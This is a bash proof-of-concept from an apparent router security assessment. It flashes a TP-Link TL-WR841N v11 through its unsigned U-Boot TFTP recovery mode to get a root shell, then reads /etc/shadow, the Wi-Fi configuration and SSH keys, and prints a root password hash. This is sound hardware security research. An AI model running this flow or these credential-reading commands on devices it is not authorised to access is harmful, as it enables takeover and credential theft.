#!/usr/bin/env bash
# =============================================================================
# TP-Link TL-WR841N v11 — U-Boot TFTP Recovery → OpenWrt Root Shell
# 1:1 Reproducible PoC
#
# CVSS 4.0: 8.6 (Critical) — AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
# EPSS: 0.05–0.40% (0–35th percentile, targeted physical-access attack)
#
# Framework Mapping:
#   OWASP ISTG: ISTG-INT[UART]-AUTHZ-002, ISTG-FW[UPDT]-CRYPT-001/004
#   OWASP FSTM: Stage 7 Bootloader Testing (TFTP recovery)
#   OWASP ISVS: V3.1.1 (L2/L3 fail), V5.1.1 (L2/L3 fail)
#
# Attack path:
#   1. UART serial console (CP2102 @ 115200) to identify board + U-Boot version
#   2. Factory reset via button → sets is_auto_upload_firmware=1 in U-Boot env
#   3. Serve OpenWrt factory image via TFTP on 192.168.0.66
#   4. Power cycle with reset held → U-Boot fetches + flashes firmware
#   5. LEDE/OpenWrt boots → root shell with empty password via SSH
#
# SBOM:
#   U-Boot:  1.1.4 (Mar 25 2016) — no boot password, no secure boot
#   Kernel:  2.6.31 (stock) / 4.4.92 (LEDE 17.01.4)
#   Flash:   GigaDevice GD25Q32 (4MB SPI NOR)
#   DRAM:    Zentel A3S56D40GTP-50L (32MB SDRAM)
#   SoC:     Qualcomm QCA9533 (MIPS 24Kc, 560 MHz)
#   Signed:  NO — no firmware signing, no FIT signature, no rollback protection
#
# Prerequisites:
#   - TL-WR841N v11 hardware (ap143-2.0, QCA9533, 4MB flash, 32MB DRAM)
#   - CP2102 USB-UART adapter (TX→RX, RX→TX, GND→GND, 3.3V NOT connected)
#   - Ethernet cable: router WAN port → host NIC (direct, no switch/NAT)
#   - OpenWrt LEDE 17.01.4 factory image (or stock firmware for revert)
#
# Tested on: Kali Linux VM with libvirt bridged networking (virbr0 + eno1)
# Report:    tplink_wr841n_v11_tftp_recovery_report.md
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── CONFIG ──────────────────────────────────────────────────────────────────
UART="/dev/ttyUSB0"
BAUD=115200
RECOVERY_IP="192.168.0.66"
RECOVERY_CLIENT="192.168.0.86"
RECOVERY_FILENAME="wr841nv11_tp_recovery.bin"
OPENWRT_IP="192.168.1.1"
FIRMWARE_DIR="/tmp/tftp"
OPENWRT_URL="https://downloads.openwrt.org/releases/17.01.4/targets/ar71xx/generic/lede-17.01.4-ar71xx-generic-tl-wr841-v11-squashfs-factory.bin"
STOCK_FW="${SCRIPT_DIR}/firmwares/stock/wr841n_v11_160325.bin"
OPENWRT_FW="${SCRIPT_DIR}/firmwares/openwrt/lede-17.01.4-ar71xx-generic-tl-wr841-v11-squashfs-factory.bin"

SSH_OPTS="-o KexAlgorithms=diffie-hellman-group14-sha1 -o HostKeyAlgorithms=ssh-rsa -o Ciphers=aes128-ctr -o MACs=hmac-sha1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

SSH_SHELL="ssh $SSH_OPTS root@${OPENWRT_IP}"

# ── COLORS ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'
GRN='\033[0;32m'
YEL='\033[0;33m'
CYN='\033[0;36m'
RST='\033[0m'

info()  { echo -e "${GRN}[+]${RST} $*"; }
warn()  { echo -e "${YEL}[!]${RST} $*"; }
fail()  { echo -e "${RED}[-]${RST} $*"; exit 1; }
step()  { echo -e "\n${CYN}═══ STEP $1: $2 ═══${RST}"; }

# =============================================================================
step 1 "UART Wiring Verification"
# =============================================================================

info "CP2102 wiring (do NOT connect 3.3V — router is self-powered):"
info "  CP2102 TX  →  Router RX (board pin header, pin varies)"
info "  CP2102 RX  →  Router TX"
info "  CP2102 GND →  Router GND"
info "  CP2102 VCC →  NOT CONNECTED"

# Kill any stale process holding the port
fuser -k -9 "$UART" 2>/dev/null || true
sleep 1

# Configure port
stty -F "$UART" "$BAUD" raw -echo 2>/dev/null || fail "Cannot open $UART — check CP2102 is plugged in"

info "UART port $UART opened at $BAUD baud"

# Quick read test — power on the router and check for kernel output
info "Power on the router and watch for output (5s window)..."
exec 9<>"$UART"
(timeout 5 cat <&9 | cat -v &
 CATPID=$!
 sleep 6
 kill $CATPID 2>/dev/null || true)

# Expected output contains:
#   U-Boot 1.1.4 (Mar 25 2016)
#   ap143-2.0 - Honey Bee 2.0
#   flash size 4MB, sector count = 64
#   DRAM: 32 MB
#   (none) login:

info "Expected in UART output:"
info "  U-Boot 1.1.4 (Mar 25 2016)"
info "  ap143-2.0 - Honey Bee 2.0"
info "  flash size 4MB, sector count = 64"
info "  DRAM:  32 MB"
info "  (none) login:"

# =============================================================================
step 2 "Fingerprint the Board"
# =============================================================================

info "Capturing full boot to file for analysis..."
(fuser -k -9 "$UART" 2>/dev/null || true; sleep 1
 stty -F "$UART" "$BAUD" raw -echo
 exec 9<>"$UART"
 timeout 30 cat <&9 > /tmp/wr841n_boot_capture.txt) || true

info "Boot capture saved to /tmp/wr841n_boot_capture.txt"

# Verify board identity
if grep -q "ap143-2.0" /tmp/wr841n_boot_capture.txt 2>/dev/null; then
    info "Board confirmed: ap143-2.0 (TL-WR841N v11)"
elif grep -q "TL-WR841N" /tmp/wr841n_boot_capture.txt 2>/dev/null; then
    info "Board confirmed: TL-WR841N variant"
else
    warn "Board identity not confirmed in capture — verify manually"
fi

if grep -q "flash size 4MB" /tmp/wr841n_boot_capture.txt 2>/dev/null; then
    info "Flash: 4MB (CRITICAL — fits the 3.75MB LEDE/OpenWrt factory image)"
elif grep -q "flash size 8MB" /tmp/wr841n_boot_capture.txt 2>/dev/null; then
    warn "Flash: 8MB — this is likely a v12+ board. Verify firmware compatibility."
fi

# =============================================================================
step 3 "Firmware Preparation"
# =============================================================================

mkdir -p "$FIRMWARE_DIR"

if [[ -f "$OPENWRT_FW" ]]; then
    info "Using local OpenWrt factory image: $OPENWRT_FW"
    cp "$OPENWRT_FW" "$FIRMWARE_DIR/$RECOVERY_FILENAME"
else
    info "Downloading LEDE 17.01.4 factory image..."
    wget -q -O "$FIRMWARE_DIR/$RECOVERY_FILENAME" "$OPENWRT_URL"
fi

# Verify size and TP-Link header
FW_SIZE=$(stat -c%s "$FIRMWARE_DIR/$RECOVERY_FILENAME" 2>/dev/null)
FW_MAGIC=$(xxd -l 4 -p "$FIRMWARE_DIR/$RECOVERY_FILENAME" 2>/dev/null)
FW_SHA1=$(sha1sum "$FIRMWARE_DIR/$RECOVERY_FILENAME" | cut -d' ' -f1)

info "Firmware: $FIRMWARE_DIR/$RECOVERY_FILENAME"
info "  Size:  $FW_SIZE bytes"
info "  Magic: $FW_MAGIC (expected: 01000000 = TP-Link header 'OpenWrt')"
info "  SHA1:  $FW_SHA1"

if [[ "$FW_SIZE" != "3932160" ]]; then
    warn "Size is $FW_SIZE (expected 3932160 for LEDE 17.01.4)"
    warn "OpenWrt 18.06.9 is 3866624 bytes — different size is OK if TP-Link header present"
fi

if [[ "$FW_MAGIC" != "01000000" ]]; then
    warn "TP-Link header magic mismatch — firmware may not be accepted by U-Boot"
fi

# =============================================================================
step 4 "Network Setup — Bridged VM Scenario"
# =============================================================================

# The host must bridge the physical NIC (eno1) into the VM's virtual bridge (virbr0)
# so that TFTP traffic from the router reaches the VM at L2.

info "=== HOST-SIDE SETUP (run on the host if using a VM) ==="
info ""
info "  # 1. Add physical NIC to virbr0 bridge:"
info "  sudo ip link set <router-nic> master virbr0"
info ""
info "  # 2. Verify both VM tap and physical NIC are on the bridge:"
info "  bridge link show virbr0"
info "  # Should show: vnet2 (VM tap) + eno1 (physical NIC)"
info ""
info "  # 3. In the VM, add recovery IP to eth0:"
info "  sudo ip addr add ${RECOVERY_IP}/24 dev eth0"
info ""
info "=== END HOST SETUP ==="
info ""

# Verify VM-side state
info "Checking VM network state..."
VM_ETH0_ADDRS=$(ip -4 addr show eth0 2>/dev/null | grep "inet " || true)
if echo "$VM_ETH0_ADDRS" | grep -q "$RECOVERY_IP"; then
    info "VM eth0 has $RECOVERY_IP ✓"
else
    warn "VM eth0 MISSING $RECOVERY_IP — run: sudo ip addr add ${RECOVERY_IP}/24 dev eth0"
fi

# =============================================================================
step 5 "Start TFTP Server"
# =============================================================================

info "Killing any existing TFTP server..."
pkill atftpd 2>/dev/null || true
sleep 1

info "Starting atftpd on ${RECOVERY_IP}:69..."
atftpd --daemon --bind-address "$RECOVERY_IP" --verbose "$FIRMWARE_DIR"

# Verify
sleep 1
if ss -ulpn | grep -q ":69"; then
    info "atftpd running, bound to ${RECOVERY_IP}:69 ✓"
else
    fail "atftpd failed to start — check port 69 availability"
fi

if [[ -f "$FIRMWARE_DIR/$RECOVERY_FILENAME" ]]; then
    info "Payload ready: $FIRMWARE_DIR/$RECOVERY_FILENAME ✓"
else
    fail "Payload missing: $FIRMWARE_DIR/$RECOVERY_FILENAME"
fi

# =============================================================================
step 6 "Arm UART Capture + Trigger Recovery"
# =============================================================================

info "Arming UART capture (120s window)..."
(fuser -k -9 "$UART" 2>/dev/null || true; sleep 1
 stty -F "$UART" "$BAUD" raw -echo
 exec 9<>"$UART"
 timeout 120 cat <&9 > /tmp/wr841n_recovery.txt) &
CAPTURE_PID=$!
sleep 2

info "UART capture armed (PID $CAPTURE_PID → /tmp/wr841n_recovery.txt)"
info ""
info "═══════════════════════════════════════════════════════════════════"
info "  NOW DO THE FOLLOWING ON THE ROUTER:"
info ""
info "  1. Unplug the router's power"
info "  2. Press and HOLD the Reset button"
info "  3. While holding Reset, plug power back in"
info "  4. KEEP HOLDING Reset for at least 8-10 seconds"
info "  5. Release Reset"
info ""
info "  You should see the router's power LED cycle (off → on → blinking)"
info "  The reset hold triggers factory restore → sets is_auto_upload_firmware=1"
info "═══════════════════════════════════════════════════════════════════"
info ""
info "Waiting up to 120s for TFTP transfer and reboot..."

wait $CAPTURE_PID 2>/dev/null || true

# =============================================================================
step 7 "Verify Flash Success"
# =============================================================================

info "Checking recovery capture..."

# Check for recovery mode
if grep -q "is_auto_upload_firmware=1" /tmp/wr841n_recovery.txt 2>/dev/null; then
    info "Recovery mode triggered (is_auto_upload_firmware=1) ✓"
else
    warn "Recovery mode NOT triggered — may need to retry factory reset"
    warn "Try: hold reset longer (10-15 seconds) during power-on"
fi

# Check for successful TFTP
if grep -q "Bytes transferred" /tmp/wr841n_recovery.txt 2>/dev/null; then
    BYTES=$(grep "Bytes transferred" /tmp/wr841n_recovery.txt | grep -oP '0x[0-9a-f]+' | tail -1)
    info "TFTP transfer complete: $BYTES bytes ✓"
else
    if grep -q "Retry count exceeded" /tmp/wr841n_recovery.txt 2>/dev/null; then
        warn "TFTP FAILED — Retry count exceeded"
        warn "Check: cable direct to NIC? IP 192.168.0.66 on correct interface?"
        warn "Check: bridge link show virbr0 shows both vnet2 and physical NIC?"
    fi
fi

# Check for OpenWrt boot
if grep -q "LEDE" /tmp/wr841n_recovery.txt 2>/dev/null || \
   grep -q "OpenWrt" /tmp/wr841n_recovery.txt 2>/dev/null; then
    info "OpenWrt/LEDE kernel booted ✓"
elif grep -q "jffs2_build_filesystem" /tmp/wr841n_recovery.txt 2>/dev/null; then
    info "OpenWrt jffs2 first-boot formatting detected ✓"
else
    warn "Could not confirm OpenWrt boot from capture"
fi

# Check for flash operations
if grep -q "Erased.*sectors" /tmp/wr841n_recovery.txt 2>/dev/null; then
    info "Flash erase confirmed ✓"
fi
if grep -q "product id verify" /tmp/wr841n_recovery.txt 2>/dev/null; then
    info "TP-Link product ID verified by U-Boot ✓"
fi

# =============================================================================
step 8 "Move Cable to LAN + SSH Access"
# =============================================================================

info ""
info "═══════════════════════════════════════════════════════════════════"
info "  MOVE the ethernet cable from WAN to LAN1 on the router"
info "  (LEDE default LAN = 192.168.1.1 on switch ports 1-4)"
info "  Wait 5 seconds for the link to come up"
info "═══════════════════════════════════════════════════════════════════"
info ""
info "Press Enter after moving the cable..."
read -r

# Wait for router to be ready
info "Waiting for router to boot fully (jffs2 formatting takes ~20s)..."
for i in $(seq 1 15); do
    if ping -c 1 -W 1 "$OPENWRT_IP" &>/dev/null; then
        info "Router reachable at $OPENWRT_IP ✓"
        break
    fi
    info "  Waiting... ($i/15)"
    sleep 3
done

# Quick port scan
info "Port scan:"
for port in 22 23 80; do
    python3 -c "
import socket; s = socket.socket(); s.settimeout(2)
try:
    s.connect(('$OPENWRT_IP', $port))
    print(f'  Port $port: OPEN')
except:
    print(f'  Port $port: closed')
s.close()
" 2>/dev/null
done

# =============================================================================
step 9 "SSH into LEDE — Root Shell"
# =============================================================================

info ""
info "Attempting SSH with legacy KEX algorithms..."
info "  OpenSSH 10.x requires legacy algorithms for LEDE 17.01's old dropbear"
info "  ssh $SSH_OPTS root@$OPENWRT_IP"
info ""

# Test SSH connectivity
if ssh $SSH_OPTS -o BatchMode=yes -o ConnectTimeout=5 root@${OPENWRT_IP} exit 2>/dev/null; then
    info "SSH connection successful ✓"
else
    # Try with empty password via expect
    info "Trying SSH with password authentication..."
    if command -v expect &>/dev/null; then
        expect -c "
            spawn ssh $SSH_OPTS root@${OPENWRT_IP}
            expect {
                \"password:\" { send \"\r\"; exp_continue }
                \"#\" { send \"cat /etc/openwrt_release\r\"; expect \"#\"; send \"exit\r\" }
                timeout { exit 1 }
            }
        " 2>/dev/null
    fi
fi

# =============================================================================
step 10 "Enumerate the Compromised Router"
# =============================================================================

info "Running enumeration commands via SSH..."

eval "$SSH_SHELL 'cat /etc/openwrt_release'" 2>/dev/null && true
echo "---"
eval "$SSH_SHELL 'uname -a'" 2>/dev/null && true
echo "---"
eval "$SSH_SHELL 'id'" 2>/dev/null && true
echo "---"
eval "$SSH_SHELL 'cat /etc/shadow'" 2>/dev/null && true
echo "---"
eval "$SSH_SHELL 'ip -br addr'" 2>/dev/null && true
echo "---"
eval "$SSH_SHELL 'cat /etc/config/wireless'" 2>/dev/null && true
echo "---"
eval "$SSH_SHELL 'cat /etc/dropbear/authorized_keys 2>/dev/null'" 2>/dev/null && true
echo "---"
eval "$SSH_SHELL 'cat /proc/mtd'" 2>/dev/null && true
echo "---"

# =============================================================================
step 11 "Proof of Root"
# =============================================================================

info ""
info "═══════════════════════════════════════════════════════════════════"
info "  PROOF OF ROOT ACCESS"
info "═══════════════════════════════════════════════════════════════════"

eval "$SSH_SHELL 'echo ROOT_UID=\$(id -u); echo ROOT_GID=\$(id -g); hostname; cat /etc/passwd | head -1; echo PASSWD_HASH=\$(grep ^root /etc/shadow | cut -d: -f2)'" 2>/dev/null && true

info ""
info "SSH command for interactive root shell:"
info "  $SSH_SHELL"
info ""
info "Or with password prompt:"
info "  ssh root@${OPENWRT_IP}   # enter empty password (just press Enter)"
info ""

# =============================================================================
step 12 "Stock Firmware Revert (Optional)"
# =============================================================================

info ""
info "═══════════════════════════════════════════════════════════════════"
info "  TO REVERT TO STOCK TP-LINK FIRMWARE:"
info "═══════════════════════════════════════════════════════════════════"
info ""
info "  1. Copy stock firmware to TFTP payload (same filename):"
info "     sudo cp $STOCK_FW $FIRMWARE_DIR/$RECOVERY_FILENAME"
info ""
info "  2. Power cycle router with reset held (same as Step 6)"
info ""
info "  3. Router recovers to stock: IP 192.168.0.1, admin/admin"
info ""

# =============================================================================
# SUMMARY
# =============================================================================

echo ""
info "═══════════════════════════════════════════════════════════════════"
info "  ATTACK SUMMARY"
info "═══════════════════════════════════════════════════════════════════"
info ""
info "  Target:     TP-Link TL-WR841N v11 (ap143-2.0, QCA9533)"
info "  U-Boot:     1.1.4 (Mar 25 2016) — no boot password/interrupt"
info "  Attack:     U-Boot TFTP recovery mode"
info "  Trigger:    Factory reset via button (hold 8-10s at power-on)"
info "  Vector:     Ethernet → U-Boot TFTP → OpenWrt factory image"
info "  Firmware:   LEDE 17.01.4 ($FW_SHA1)"
info "  Result:     Root shell (uid=0, empty password)"
info "  Access:     SSH (legacy KEX), web (192.168.1.1), serial"
info "  Revert:     Same TFTP recovery with stock .bin"
info ""
info "  Key quirk:  LEDE 17.01.4 SSH requires legacy algorithms:"
info "    - KexAlgorithms=diffie-hellman-group14-sha1"
info "    - HostKeyAlgorithms=ssh-rsa"
info "    - Ciphers=aes128-ctr"
info "    - MACs=hmac-sha1"
info ""
info "  Root hash:  \$1\$GTN.gpri\$DlSyKvZKMR9A9Uj9e9wR3/ (stock firmware)"
info "              After OpenWrt flash: empty password, no hash"
info ""
info "  CVSS 4.0:   AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H = 8.6 (Critical)"
info "  EPSS:       0.05–0.40% (targeted, physical-access class)"
info "  ISVS:       V3.1.1 / V5.1.1 non-conformance (L2/L3)"
info ""
info "═══════════════════════════════════════════════════════════════════"
